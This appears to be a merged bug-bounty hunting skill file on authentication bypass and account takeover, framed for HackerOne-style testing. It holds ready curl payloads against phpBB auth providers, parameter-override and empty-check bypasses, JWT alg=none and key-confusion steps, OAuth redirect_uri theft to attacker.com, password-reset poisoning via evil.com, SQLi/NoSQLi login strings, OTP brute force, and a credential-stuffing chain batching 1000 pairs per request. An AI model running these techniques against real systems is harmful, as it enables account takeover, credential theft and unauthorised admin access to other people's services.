- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.

### Phase X — Auth Provider Confusion

Some applications support multiple authentication providers (local DB, OAuth, LDAP, Apache HTTP Basic, SAML). Changing the `auth_provider` parameter to an alternative handler may skip password verification entirely. Confirmed on phpBB CVE-2026-48611 where `auth_provider=apache` bypassed password check.

```bash
# Enumerate auth providers via parameter fuzzing
for provider in local oauth ldap apache saml cas openid sso external; do
  curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/auth/login" \
    -d "username=admin&password=x&auth_provider=$provider" \
    -w "$provider — %{http_code}\n" -o /dev/null
done

# phpBB-specific: Apache provider trusts HTTP Basic header without password
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/ucp.php?mode=login_link&auth_provider=apache&login_link_test=1" \
  -H "Authorization: Basic $(echo -n 'admin:x' | base64)" \
  -d "login_username=admin&login_password=x&login=Login"
```

### Phase Y — POST Body Parameter Override

Some frameworks give POST body parameters priority over GET query parameters. An attacker can hide the real `mode=login_link` in the POST body while the WAF/logger sees only `mode=login` in the URL:

```bash
# WAF sees GET: mode=login — attacker sends POST body: mode=login_link
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/ucp.php?mode=login&login_link_test=1" \
  -d "login_username=admin&login_password=x&mode=login_link&auth_provider=apache&login=Login"
```

### Phase Z — Dummy Parameter Injection for Empty-Check Bypass

When code requires certain parameters to be non-empty but doesn't validate their content, inject dummy values:

```bash
# Code checks: if (empty($login_link_data)) → block
# Bypass: add any login_link_* parameter with arbitrary value
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/ucp.php?mode=login_link&login_link_dummy=1"
```

### Escalation: Auth Bypass → Admin via User Group Management

After impersonating a privileged user, check if group/role management is available without re-authentication. On phpBB, the founder user can add other users to the administrator group from the User Control Panel without entering their password:

```bash
# 1. Auth bypass as admin
# 2. Register new attacker account
# 3. As admin, add attacker to ADMINISTRATORS group via UCP (no password needed)
# 4. Login as attacker → full ACP access with known password

## Related Skills

- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
```

---

## Content from local version



## 🔑 Key Takeaway

> **Authentication is the gatekeeper. If it falls, everything falls.**

---

*Last updated: July 25, 2026*
*Sources: HackerOne, Bug Bounty writeups, NahamSec, Community*


---
# Merged from: hunt-auth-bypass-complete

# Authentication Bypass — Complete Hunting Skill


## Source: HackerOne reports, Bug Bounty writeups, Real-world techniques




## 🔐 Authentication Attack Surface

### Entry Points to Test

| Entry Point | What to Test |
|-------------|--------------|
| Login | Credential stuffing, brute force, default creds |
| Registration | Account enumeration, duplicate registration |
| Password Reset | Host header injection, token manipulation |
| MFA/2FA | Bypass, brute force, race condition |
| OAuth/SSO | Redirect URI, state, PKCE bypass |
| JWT | Algorithm confusion, none algorithm, key leakage |
| Session | Fixation, hijacking, timeout |
| API Keys | Leakage, weak generation, no expiry |
| SAML | XSW, signature stripping, assertion injection |
| LDAP | Injection, default creds |




## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| jwt_tool | JWT manipulation |
| Burp Suite | Proxy + scanner |
| Hydra | Brute force |
| sqlmap | SQL injection auth bypass |
| Autorize | IDOR/BAC testing |
| Arjun | Parameter discovery |

---



## 🔴 High-Impact Auth Bypass Patterns

### 1. JWT None Algorithm → Account Takeover

```bash
# 1. Intercept JWT
# 2. Decode header: {"alg":"RS256","typ":"JWT"}
# 3. Change to: {"alg":"none","typ":"JWT"}
# 4. Remove signature
# 5. Send request
# 6. Access victim's account
```

### 2. OAuth Redirect URI → Account Takeover

```bash
# 1. Find OAuth flow
# 2. Change redirect_uri to attacker.com
# 3. Victim clicks link
# 4. Auth code sent to attacker.com
# 5. Exchange code for token
# 6. Access victim's account
```

### 3. Session Fixation → Account Takeover

```bash
# 1. Send victim a link with fixed session ID
# 2. Victim logs in with that session
# 3. Attacker uses same session ID
# 4. Access victim's account
```

### 4. MFA Brute Force → Account Takeover

```bash
# 1. Get valid session after password
# 2. Brute force 6-digit OTP (000000-999999)
# 3. If no rate limit → success
# 4. Access victim's account
```

### 5. Password Reset Poisoning → Account Takeover

```bash
# 1. Send reset request with evil Host header
# 2. Reset link sent to victim with evil.com
# 3. Victim clicks link (thinking it's legit)
# 4. Attacker intercepts reset token
# 5. Reset victim's password
# 6. Access victim's account
```




## 📋 Auth Bypass Checklist

- [ ] Credential stuffing tested
- [ ] Brute force tested (rate limit check)
- [ ] Default credentials tested
- [ ] Account enumeration tested
- [ ] JWT vulnerabilities checked
- [ ] OAuth redirect_uri tested
- [ ] State parameter tested
- [ ] PKCE bypass tested
- [ ] MFA bypass tested
- [ ] OTP brute force tested
- [ ] SAML attacks tested
- [ ] Session fixation tested
- [ ] Session hijacking tested
- [ ] Password reset poisoning tested
- [ ] API auth bypass tested
- [ ] LDAP injection tested
- [ ] Hidden endpoints tested

---



## Reference Map

| File | Covers |
|------|--------|
| `references/js-recon.md` | Mining the SPA JS bundle for endpoints, role/permission names, user-object fields, admin routes, client-side-only auth gates, token handling |
| `references/discovery.md` | Hidden registration/admin endpoints, default creds, forgotten login flows, actuator leaks, API versioning |
| `references/login-bypass.md` | SQLi/NoSQLi auth bypass, type juggling, response manipulation, verb tampering, 403/401 path bypass, content-type switching |
| `references/privesc.md` | Mass assignment, JWT attacks, IDOR in auth flows, GraphQL auth bypass |
| `references/mfa.md` | 2FA/MFA/OTP bypass and auth race conditions |
| `references/sso.md` | OAuth misconfig, SAML assertion manipulation |
| `references/passwordless.md` | Password reset abuse, magic link / passwordless takeover |
| `references/session-cache.md` | Session fixation/puzzling, request smuggling, cache deception/poisoning, CORS to ATO, WebSocket auth, blind XSS to session theft |
| `references/chaining.md` | Worked ATO chains, the decision tree, tool reference lessons |

## 🎯 Priority Matrix

| Finding | Severity | Bounty |
|---------|----------|--------|
| JWT None → ATO | Critical | $5,000-50,000 |
| OAuth Redirect → ATO | Critical | $5,000-50,000 |
| Session Fixation → ATO | Critical | $5,000-20,000 |
| MFA Brute Force → ATO | Critical | $5,000-50,000 |
| Password Reset Poisoning | High | $2,000-10,000 |
| JWT Role Escalation | High | $2,000-10,000 |
| Account Enumeration | Medium | $500-2,000 |
| Weak Password Policy | Low | $100-500 |

---



## The Core Question: Where Are You in the Auth Flow?

Pick the branch that matches your current access. Each points to the reference file with the concrete techniques, payloads, and real examples. You will often move between branches as a chain develops (for example: find a hidden endpoint, mass-assign yourself admin, then IDOR the admin API).

### You Have NO Account / Cannot Reach the App

**Goal:** Find a door, or walk through the login without valid creds.

- Mine the JS bundle for endpoints, hidden login/registration routes, and admin paths the UI hides. See `references/js-recon.md`.
- Hidden registration, user-creation, and admin endpoints (Swagger/OpenAPI, GraphQL introspection, ffuf, Wayback). See `references/discovery.md`.
- Default credentials and forgotten native login flows (third-party software, `cs_login`, `wp-login.php`, Spring actuator heapdumps leaking sessions). See `references/discovery.md`.
- API version downgrade (`/api/v1/` unauthenticated where `/api/v2/` is not). See `references/discovery.md`.
- SQL and NoSQL injection on the login form (`' OR 1=1--`, `{"user":{"$ne":""}}`). See `references/login-bypass.md`.

### There IS a Login Page, Valid Creds Unknown

**Goal:** Get past the check itself.

- SQLi / NoSQLi auth bypass and PHP type juggling (magic hashes, loose comparison). See `references/login-bypass.md`.
- Response manipulation: flip `401` to `200`, `{"success":false}` to `true` client-side. See `references/login-bypass.md`.
- HTTP verb tampering and 403/401 path bypass (`/admin;/`, casing, encoding, `X-Original-URL`, IP-spoof headers). See `references/login-bypass.md`.
- Content-type / format switching (JSON to XML to form-data, different code paths). See `references/login-bypass.md`.

### You Are Logged In, Low Privilege

**Goal:** Become admin, or read/modify other users' objects.

- Mine the JS bundle first for the exact role strings, user-object fields, admin routes, and client-side-only gates that make the rest cheap. See `references/js-recon.md`.
- Mass assignment: inject `role`, `isAdmin`, `is_superuser`, `verified` on register/profile-update. See `references/privesc.md`.
- JWT attacks: `alg:none`, RS256-to-HS256 key confusion, `jwk`/`kid` injection, weak-secret brute force. See `references/privesc.md`.
- IDOR in auth flows: swap user IDs, reset tokens, `itemId`, `dsIds` to reach other tenants. See `references/privesc.md`.
- GraphQL: introspection for hidden admin mutations, field suggestions, nested-authz gaps, batch abuse. See `references/privesc.md`.

### The App Has MFA / 2FA / OTP

**Goal:** Skip it or defeat it.

- Response manipulation, force-browse past the OTP page, missing account-binding, OTP reuse/no-expiry, backup-code enumeration, brute force, GraphQL alias batching, race conditions, CSRF on "disable 2FA." See `references/mfa.md`.

### The App Uses SSO (OAuth or SAML)

**Goal:** Log in as someone else through the trust relationship.

- OAuth: `redirect_uri` manipulation, missing `state` (CSRF), token leakage via `Referer`, account-linking takeover. See `references/sso.md`.
- SAML: signature stripping, NameID modification, XML Signature Wrapping (SAML Raider), comment injection, parser differentials (ruby-saml CVE). See `references/sso.md`.

### There is a Password Reset or Magic Link / Passwordless Flow

**Goal:** Take over an account through the recovery path.

- Host-header injection, token in the response body, token prediction, IDOR on reset token, token removal/null token. See `references/passwordless.md`.
- Magic-link token leaked in API response, host-header injection, `Referer` leak, reuse/no-expiry, `redirect_url` manipulation. See `references/passwordless.md`.

### You Want to Poison Sessions, Caches, or Steal Employee Sessions

**Goal:** Hijack authenticated state indirectly.

- Session fixation and session puzzling, HTTP request smuggling (CL.TE / TE.CL to bypass frontend auth), web cache deception and poisoning (ChatGPT ATO), CORS misconfig to ATO, WebSocket auth (CSWSH), blind XSS into internal employee tools. See `references/session-cache.md`.

---

## Full-Surface Auth Checklist (Mind Map — new reference)

**Trigger:** load when testing any login / register / 2FA / password-reset / OAuth / account-linking flow.
**Priority order:** P0 = 2FA channel-switch, OTP alias (plus-addressing), OAuth redirect_uri, token race → P1 = registration email tricks, reset-link poisoning, link-account CSRF → P2 = transfer/JSONP, QR-race.

📄 **Playbook:** [`references/auth-surface-mindmap.md`](references/auth-surface-mindmap.md) — every node as Why → Test → Payload → Verdict → Severity → Chain. Payloads are generic templates; verify before claiming.

Highest-yield nodes to run per target:

| # | Node | Key tests |
|---|------|-----------|
| 1 | Registration | email CRLF (`%0a`), plus-addressing aliases, whitelist domains (`noreply@github.com`), login-immediately-after-register |
| 2 | Sign-in | response manipulation, change 2FA channel, limited-session feature probing, informational vs state-changing APIs |
| 3 | **2FA** | default-off check, channel switch (email→SMS), null/`000000`/`111111` OTP, dup param `otp=12345&otp=986765`, array OTP `otp:["12535"]`, rate-limit-on-email → ATO |
| 4 | Providers | redirect URI fixed/dynamic, code expiration, multi-app code reuse, all OAuth channels (Google etc.) |
| 5 | **OAuth redirect_uri** | state re-use, fullwidth dot (`evil%E3%80%82com`), tab (`%09`), double-encode (`%252e`), recollapse, `evil%E3%80%82com.target.com` |
| 6 | Auth (central) | evil app, permission/scope manipulation, code→token race, refresh_token→token race, revoked-code reuse |
| 7 | Reset link/OTP | host-header (from Referer), brute force (user const + OTP var), spray (email var + OTP const), `link=https://google.com` → critical |
| 8 | Forgot password | token predictable, one-time-use, URL-from-input, token in DOM, hidden param, path manipulation |
| 9 | **Link account** | confirm-HTTP-request check, CSRF the final request, cross-account access, deep-link merge |
| 10 | Transfers | top-level cookie (`.domain`), JSONP, redirect-URL-token-grab, CORS |
| 11 | QR login | scan-while-logged-in-B, HTTP requests at small intervals (race), force-user-HTTP-request |

**Scenario 1 (OTP alias → ATO):** `namos.toooo@gmail.com` gets OTP → brute force 3 failures → code expires → `namos.toooo+1@gmail.com` shares the SAME OTP → 2 codes for both accounts.
**Scenario 2 (reset host-header):** build reset link from `Referer`-controlled host; if code not expired → ATO.


